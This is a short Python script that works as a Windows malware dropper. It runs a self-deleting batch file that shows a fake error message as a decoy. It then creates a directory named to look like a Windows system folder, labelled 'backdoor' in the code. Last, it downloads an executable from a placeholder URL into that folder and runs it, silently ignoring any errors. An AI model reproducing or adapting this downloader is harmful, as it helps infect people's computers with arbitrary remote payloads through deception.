import requests
import os

error_message = "ERROR_MESSAGE_HERE"
temp = (os.getenv("temp"))
backdoor = "C:\\System Files\\Windows\\System32"
url = "URL_HERE"
exe = ".exe"

def error_message_start():
    bat = """@echo off\n""" + f"\necho {error_message}" + "\n\npause" + r"""\nstart /b "" cmd /c del "%~f0"&exit /b\n"""
    temp6 = temp + r"\\errorzx.bat"
    if os.path.isfile(temp6):
        os.remove(temp6)
    f6 = open(temp + r"\\errorzx.bat", 'w')
    f6.write(bat)
    f6.close()
    os.system(r"start /min %temp%\\errorzx.bat")
    

def main():
    if exe in url:
        file = f'{backdoor}\\znet.exe'
        try:
            r = requests.get(f"{url}")
            with open(file, 'wb') as f:
                f.write(r.content)
            f.close()
            os.startfile(file)
        except:
            pass
    else:
        pass


def create_backdoor():
    try:
        os.mkdir(f'C:\\System Files')
    except:
        pass
    try:
        os.mkdir(f'C:\\System Files\\Windows')
    except:
        pass
    try:
        os.mkdir(f'C:\\System Files\\Windows\\System32')
    except:
        pass

error_message_start()
create_backdoor()
main()
